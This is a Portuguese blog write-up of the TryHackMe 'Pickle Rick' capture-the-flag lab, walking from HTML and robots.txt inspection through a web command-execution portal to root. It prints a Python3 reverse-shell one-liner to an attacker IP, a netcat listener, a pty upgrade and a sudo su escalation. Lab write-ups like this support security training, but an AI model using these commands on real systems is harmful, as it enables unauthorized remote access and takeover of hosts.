---
title: "Write-up – TryHackMe – Pickle Rick"
description: "Resolução do laboratório Pickle Rick do TryHackMe, da inspeção inicial da página à última flag."
date: "2023-01-16 21:51:02 -0300"
original_updated_at: "2023-01-17T10:02:09-03:00"
author: "Alencar Silva"
category: "Offensive Security"
original_title: "Write-up – Try Hacke Me – Pickle Rick"
---

> Republicado a partir da [captura do artigo original na Wayback Machine](https://web.archive.org/web/20240414234509/https://alencarjunior.com.br/index.php/2023/write-up-try-hacke-me-pickle-rick/). A captura consultada preservou o texto e as legendas, mas 20 imagens do corpo estão indisponíveis.

![Imagem de capa]({{ '/assets/posts/write-up-try-hacke-me-pickle-rick/2023-01-16_22-00.webp' | relative_url }})

*Room Pickle Rick*

Opa, tudo bem?

Essa máquina foi bem legal de resolver, foi na curiosidade inspecionando página e permissões de acesso,

## Reconhecimento e login

Primeiro, investiguei a pagina default, com o navegador mesmo (ir pelo básico sempre me ajuda, não gosto de rodar ferramenta antes de observar), de cara o Rick já deixa claro que não lembra a senha de acesso dele, acesso do que?

> *Legenda original: Mensagem de dica, index.html*

Inspecionando a página foi possível encontrar um comentário no HTML informando o usuário do Rick, beleza, e eu uso isso onde?

> *Legenda original: Comentário HTML com informação de usuário*

Existem alguns padrões em aplicações web, páginas de login, páginas admin, o robots.txt que indica indexação do site, entre outros, para automatizar a busca você pode utilizar dirb, nikto, feroxbuster. Agora você precisa procurar essas páginas, eu parto primeiro pro robots.txt, encontrei uma string, beleza, pensei que era uma pegadinha mas foi útil para a próxima página, a famigerada login.php.

> *Legenda original: robots.txt*

Cheguei na página de login, tenho um usuário, o que eu faço? Tento brute-force, tentei algumas senhas genéricas, nome do Rick do Morty, ai vem a parte de pensar simples, que não foi o meu caso, já ia partir pro Burp e usar o intruder, ou partir pro hydra, ia demorar uma vida, então testei a string da robots.txt e passou, simples assim, o pior é que eu ia só perder tempo, porque nem tem essa palavra na rockyou,

> *Legenda original: A rockyou não quebraria a senha*

Pronto, logamos,

> *Legenda original: login.php -> usuário R1ckRul3s senha no robots.txt*

## Execução de comandos e primeiras flags

Após autenticação somos redirecionados para **portal.php**, e aqui está a mina de outro, conseguimos executar comandos no host.

***Verificando o diretório atual #pwd***

Listando o diretório já é possível encontrar a **primeira** **Flag**, e algumas documentos e páginas, incluindo uma pista, **clue.txt**.

> *Legenda original: Primeira Flag*

O comando cat não é permitido, retorna essa mensagem:

> *Legenda original: Retorno do comando #cat*

Aqui você tem algumas opções, para mim a primeira intuitiva foi abrir a **URL** indicando o arquivo, porque estavamos no diretório do servidor web, **flag!**

Você também poder comando **tac** (esse é permitido pela aplicação) para chegar no mesmo resultado.

> *Legenda original: Lendo a primeira Flag*

A pista sugere que você dê uma olhada no sistema de arquivos,

> *Legenda original: Lendo a pista*

De início já listei o diretório home, procurando por outro usuário, temos o usuário **rick** e usuário **ubuntu**,

#ls /home

> *Legenda original: Listando o diretório home*

Listando o diretório **/home/rick** encontramos a segunda flag, ***second ingredients***,

ls /home/rick/

> *Legenda original: Comando #ls no diretório /home/rick/*
> ```sh
> # tac /home/rick/second\ ingredients
> ```
>
> **Lendo a Flag**

> *Legenda original: Segunda Flag*

## Shell e acesso ao diretório root

Bom a partir daqui, acredito que seja possível resolver tudo pela interface web, infelizmente sou um pouco viciado em shell reverso, se eu posso executar comando, provavelmente posso abrir ***shell***, ai foi tentativa e erro, a máquina tem python, tem php, o que funcionou foi do revshells.com **“Python3 #1 ”**

```
export RHOST="SEU IP";export RPORT=PORTA;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```sh

Deixei o netcat escutando a porta 3060.

```
# nc -lvnp 3060
```sh

> *Legenda original: netcat*

Executei o comando para shell reverso:

> *Legenda original: Executando shell reverso*

**SHELL!!!!!**

> *Legenda original: Shell da máquina alvo*

Acredito que seja possível esse shell com upload de arquivo via comando mas não testei. Para melhorar o shell utilizei o spawn bash:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```sh

E agora a cereja do bolo, o usuário **www-data**, pode executar qualquer comando,

**# sudo -l**

> *Legenda original: Permissões sudo do usuário www-data*

Agora podemos utilizar o usuário **root**

```
# sudo su
```sh

É o primeiro CTF que eu faço do TryHackMe, normalmente em outras plataformas, a flag fica no **/root**, que foi o caso,

> *Legenda original: root!*

Por fim, realizei a leitura da flag.

```
cat /root/3rd.txt
```

> *Legenda original: Última Flag!*

Bom, é isso, até mais!
